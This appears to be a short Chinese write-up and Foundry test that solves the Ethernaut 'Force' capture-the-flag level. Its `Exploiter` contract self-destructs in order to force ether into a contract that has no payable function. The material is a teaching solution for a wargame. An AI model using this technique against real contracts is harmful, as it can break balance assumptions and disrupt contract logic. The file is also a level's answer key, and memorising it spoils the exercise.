通过在合约中调用 `selfdestruct`，可以强行向任意地址发送 ether，即使是对于并没有声明 payable 函数的合约地址也可以。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Force.sol";
import "src/levels/ForceFactory.sol";

contract TestForce is BaseTest {
    Force private level;

    constructor() public {
        levelFactory = new ForceFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = Force(levelAddress);

        assertEq(address(level).balance, 0);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        new Exploiter{value: 1}(payable(address(level)));
        assertEq(address(level).balance, 1);

        vm.stopPrank();
    }
}

contract Exploiter {
    constructor(address payable to) public payable {
        selfdestruct(to);
    }
}
```

